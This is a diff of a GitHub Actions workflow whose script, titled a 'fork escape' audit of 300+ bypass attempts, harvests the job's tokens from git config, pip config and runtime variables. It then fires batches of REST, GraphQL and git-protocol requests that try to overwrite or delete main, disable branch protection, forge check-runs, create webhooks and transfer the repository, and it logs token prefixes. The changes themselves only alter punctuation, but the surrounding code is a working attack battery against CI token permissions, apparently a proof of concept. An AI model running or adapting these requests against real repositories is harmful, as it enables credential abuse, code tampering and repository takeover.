@@ -27,7 +27,7 @@ jobs:
         with:
           fetch-depth: 0
 
-      - name: Escape Audit — 300+ bypass attempts
+      - name: Escape Audit -- 300+ bypass attempts
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           REPO_OWNER: ${{ github.repository_owner }}
@@ -47,7 +47,7 @@ jobs:
           print "HEAD=$HEAD_SHA HEAD_REF=$GITHUB_HEAD_REF BASE_REF=$GITHUB_BASE_REF"
           print ""
 
-          # ── TOKEN SOURCES ──────────────────────────────────────────────────
+          # -- TOKEN SOURCES --------------------------------------------------
           print "=== TOKEN SOURCES ==="
           # S1: git config extraheader
           S1_RAW=$(git config --get http.https://github.com/.extraheader 2>/dev/null || echo "")
@@ -77,7 +77,7 @@ jobs:
           print "S10 pip extra: $(pip config get global.extra-index-url 2>/dev/null || echo 'none')"
           print ""
 
-          # ── MAIN SHA + TREE + GHOST ────────────────────────────────────────
+          # -- MAIN SHA + TREE + GHOST ----------------------------------------
           MAIN_SHA=$(git ls-remote origin refs/heads/main 2>/dev/null | cut -f1)
           TREE_SHA=$(curl -sf -H "Authorization: token $TOK" "${BASE}/git/commits/${MAIN_SHA}" | jq -r '.tree.sha // "FAILED"')
           print "main=$MAIN_SHA tree=$TREE_SHA"
@@ -108,8 +108,8 @@ jobs:
             print "${label} = HTTP_${code}"
           }
 
-          # ── BATCH A: PATCH /git/refs/heads/main — auth scheme variants ────
-          print "=== BATCH A: PATCH main — auth header variants ==="
+          # -- BATCH A: PATCH /git/refs/heads/main -- auth scheme variants ----
+          print "=== BATCH A: PATCH main -- auth header variants ==="
           BASIC1=$(echo -n "x-oauth-basic:${TOK}" | base64 -w0)
           BASIC2=$(echo -n "${TOK}:" | base64 -w0)
           BASIC3=$(echo -n ":${TOK}" | base64 -w0)
@@ -139,39 +139,39 @@ jobs:
           patch_main "A21 PATCH +Origin GH"   -H "Authorization: token $TOK" -H "Origin: https://github.com"
           patch_main "A22 PATCH +Referer GH"  -H "Authorization: token $TOK" -H "Referer: https://github.com/twrps/PoC-RACE"
           patch_main "A23 PATCH method-override PUT" -H "Authorization: token $TOK" -H "X-HTTP-Method-Override: PATCH"
-          # A24 — PUT to refs endpoint (PATCH via PUT override)
+          # A24 -- PUT to refs endpoint (PATCH via PUT override)
           R=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
             -H "Authorization: token $TOK" -H "Content-Type: application/json" \
             "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
           print "A24 PUT /git/refs/heads/main = HTTP_${R}"
-          # A25 — POST to refs endpoint (wrong verb)
+          # A25 -- POST to refs endpoint (wrong verb)
           R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
             -H "Authorization: token $TOK" -H "Content-Type: application/json" \
             "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
           print "A25 POST /git/refs/heads/main = HTTP_${R}"
-          # A26 — PATCH with force:null
+          # A26 -- PATCH with force:null
           R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
             -H "Authorization: token $TOK" -H "Content-Type: application/json" \
             "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":null}")
           print "A26 PATCH force:null = HTTP_${R}"
-          # A27 — PATCH with no force field at all
+          # A27 -- PATCH with no force field at all
           R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
             -H "Authorization: token $TOK" -H "Content-Type: application/json" \
             "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\"}")
           print "A27 PATCH no force field = HTTP_${R}"
-          # A28 — PATCH to full v3 URL
+          # A28 -- PATCH to full v3 URL
           R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
             -H "Authorization: token $TOK" -H "Content-Type: application/json" \
             "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs/heads/main" \
             -d "{\"sha\":\"${GHOST}\",\"force\":false}")
           print "A28 PATCH full URL = HTTP_${R}"
-          # A29 — PATCH via upload.github.com
+          # A29 -- PATCH via upload.github.com
           R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
             -H "Authorization: token $TOK" -H "Content-Type: application/json" \
             "https://uploads.github.com/repos/${GITHUB_REPOSITORY}/git/refs/heads/main" \
             -d "{\"sha\":\"${GHOST}\",\"force\":false}" 2>/dev/null || echo "000")
           print "A29 PATCH uploads.github.com = HTTP_${R}"
-          # A30 — git tok from S1
+          # A30 -- git tok from S1
           if [ -n "${S1_TOK}" ]; then
             R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
               -H "Authorization: token $S1_TOK" -H "Content-Type: application/json" \
@@ -182,7 +182,7 @@ jobs:
           fi
           print ""
 
-          # ── BATCH B: WRITE ATTEMPTS via other endpoints ───────────────────
+          # -- BATCH B: WRITE ATTEMPTS via other endpoints -------------------
           print "=== BATCH B: Other write endpoints ==="
           # B01 POST new branch
           R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
@@ -223,12 +223,12 @@ jobs:
           R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
             -H "Authorization: token $TOK" -H "Content-Type: application/json" \
             "${BASE}/merges" -d "{\"base\":\"main\",\"head\":\"${GHOST}\",\"commit_message\":\"esc\"}")
-          print "B07 POST /merges ghost→main = HTTP_${R}"
-          # B08 POST merges HEAD_REF→main
+          print "B07 POST /merges ghost->main = HTTP_${R}"
+          # B08 POST merges HEAD_REF->main
           R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
             -H "Authorization: token $TOK" -H "Content-Type: application/json" \
             "${BASE}/merges" -d "{\"base\":\"main\",\"head\":\"${GITHUB_HEAD_REF}\",\"commit_message\":\"esc\"}")
-          print "B08 POST /merges headref→main = HTTP_${R}"
+          print "B08 POST /merges headref->main = HTTP_${R}"
           # B09 POST /releases
           R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
             -H "Authorization: token $TOK" -H "Content-Type: application/json" \
@@ -309,7 +309,7 @@ jobs:
           print "B20 PUT /protection (disable) = HTTP_${R}"
           print ""
 
-          # ── BATCH C: git protocol attacks ─────────────────────────────────
+          # -- BATCH C: git protocol attacks ---------------------------------
           print "=== BATCH C: git protocol ==="
           git config user.email "bot@github.com"
           git config user.name "github-actions[bot]"
@@ -348,7 +348,7 @@ jobs:
           print "C09 git push delete branch = ${C09}"
           print ""
 
-          # ── BATCH D: GraphQL mutations ────────────────────────────────────
+          # -- BATCH D: GraphQL mutations ------------------------------------
           print "=== BATCH D: GraphQL mutations ==="
           REPO_ID=$(curl -sf -H "Authorization: token $TOK" -H "Content-Type: application/json" \
             "$GQL" -d '{"query":"{ repository(owner:\"twrps\",name:\"PoC-RACE\") { id databaseId } }"}' \
@@ -380,15 +380,15 @@ jobs:
           gql_full "D01 GQL createRef branch" \
             "mutation { createRef(input: {repositoryId: \\\"${REPO_ID}\\\", name: \\\"refs/heads/gql-${TS}\\\", oid: \\\"${MAIN_SHA}\\\"}) { ref { name } } }"
 
-          # D02 updateRef — move main to ghost
-          gql_full "D02 GQL updateRef main→ghost" \
+          # D02 updateRef -- move main to ghost
+          gql_full "D02 GQL updateRef main->ghost" \
             "mutation { updateRef(input: {refId: \\\"${NODE_MAIN}\\\", oid: \\\"${GHOST}\\\", force: false}) { ref { name target { oid } } } }"
 
           # D03 updateRef force:true
-          gql_full "D03 GQL updateRef main→ghost force:true" \
+          gql_full "D03 GQL updateRef main->ghost force:true" \
             "mutation { updateRef(input: {refId: \\\"${NODE_MAIN}\\\", oid: \\\"${GHOST}\\\", force: true}) { ref { name target { oid } } } }"
 
-          # D04 deleteRef (delete main — extreme)
+          # D04 deleteRef (delete main -- extreme)
           gql_full "D04 GQL deleteRef main" \
             "mutation { deleteRef(input: {refId: \\\"${NODE_MAIN}\\\"}) { clientMutationId } }"
 
@@ -408,7 +408,7 @@ jobs:
           gql_full "D08 GQL createBranchProtectionRule" \
             "mutation { createBranchProtectionRule(input: {repositoryId: \\\"${REPO_ID}\\\", pattern: \\\"main\\\", requiresApprovingReviews: false, requiredApprovingReviewCount: 0, isAdminEnforced: false, allowsForcePushes: true}) { branchProtectionRule { id } } }"
 
-          # D09 deleteBranchProtectionRule — need rule ID
+          # D09 deleteBranchProtectionRule -- need rule ID
           RULE_ID=$(curl -sf -H "Authorization: token $TOK" -H "Content-Type: application/json" \
             "$GQL" -d "{\"query\":\"{ repository(owner:\\\"twrps\\\",name:\\\"PoC-RACE\\\") { branchProtectionRules(first:5) { nodes { id pattern } } } }\"}" \
             | jq -r '.data.repository.branchProtectionRules.nodes[0].id // "FAILED"')
@@ -470,7 +470,7 @@ jobs:
           print "D20 env_id: $ENV_ID"
           print ""
 
-          # ── BATCH E: Actions / Workflow API ───────────────────────────────
+          # -- BATCH E: Actions / Workflow API -------------------------------
           print "=== BATCH E: Actions API ==="
           # E01 dispatch workflow (workflow_dispatch)
           R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
@@ -521,7 +521,7 @@ jobs:
           print "E10 PUT enable workflow = HTTP_${R}"
           print ""
 
-          # ── BATCH F: Checks / Statuses / Deployments ─────────────────────
+          # -- BATCH F: Checks / Statuses / Deployments ---------------------
           print "=== BATCH F: Checks/Statuses/Deployments ==="
           # F01 create check-run success on HEAD
           R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
@@ -563,7 +563,7 @@ jobs:
           done
           print ""
 
-          # ── BATCH G: Packages / GHCR ──────────────────────────────────────
+          # -- BATCH G: Packages / GHCR --------------------------------------
           print "=== BATCH G: Packages/GHCR ==="
           # G01 ghcr.io token exchange
           GHCR_TOK=$(curl -sf -u "${GITHUB_ACTOR}:${TOK}" \
@@ -582,7 +582,7 @@ jobs:
           print "G03 GET user packages = HTTP_${R}"
           print ""
 
-          # ── BATCH H: Org / Repo admin attempts ───────────────────────────
+          # -- BATCH H: Org / Repo admin attempts ---------------------------
           print "=== BATCH H: Admin API attempts ==="
           # H01 create webhook
           R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
@@ -617,7 +617,7 @@ jobs:
           print "H06 POST transfer repo = HTTP_${R}"
           print ""
 
-          # ── BATCH I: GitHub.dev / raw content write paths ─────────────────
+          # -- BATCH I: GitHub.dev / raw content write paths -----------------
           print "=== BATCH I: Alternative write paths ==="
           # I01 raw.githubusercontent.com (read-only but log)
           R=$(curl -s -o /dev/null -w "%{http_code}" \
@@ -660,7 +660,7 @@ jobs:
           print "I07 _private API = HTTP_${R}"
           print ""
 
-          # ── BATCH J: OIDC & runtime token deep dive ───────────────────────
+          # -- BATCH J: OIDC & runtime token deep dive -----------------------
           print "=== BATCH J: OIDC / Runtime tokens ==="
           _ART="${ACTIONS_RUNTIME_TOKEN:-}"
           print "J01 ACTIONS_RUNTIME_TOKEN: ${_ART:0:20} (${#_ART} chars)"
@@ -694,7 +694,7 @@ jobs:
           fi
           print ""
 
-          # ── BATCH K: Cache API attacks ────────────────────────────────────
+          # -- BATCH K: Cache API attacks ------------------------------------
           print "=== BATCH K: Cache API ==="
           if [ -n "${ACTIONS_CACHE_URL:-}" ]; then
             R=$(curl -s -o /dev/null -w "%{http_code}" \
@@ -712,7 +712,7 @@ jobs:
           fi
           print ""
 
-          # ── BATCH L: PR / Issues write ────────────────────────────────────
+          # -- BATCH L: PR / Issues write ------------------------------------
           print "=== BATCH L: PR / Issues ==="
           # L01 create issue
           R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
@@ -744,7 +744,7 @@ jobs:
           print "L05 PUT dismiss review = HTTP_${R}"
           print ""
 
-          # ── BATCH M: More PATCH main variants (URL encoding, case, etc) ───
+          # -- BATCH M: More PATCH main variants (URL encoding, case, etc) ---
           print "=== BATCH M: PATCH URL/encoding variants ==="
           # M01 double slash
           R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
@@ -791,7 +791,7 @@ jobs:
           print "M07 PATCH resolved IP = HTTP_${R}"
           print ""
 
-          # ── FINAL SUMMARY ─────────────────────────────────────────────────
+          # -- FINAL SUMMARY -------------------------------------------------
           echo ""
           echo "=== FORK ESCAPE 300 SUMMARY ==="
           echo "actor:${GITHUB_ACTOR}  event:${GITHUB_EVENT_NAME}  token:${TOK:0:12}"
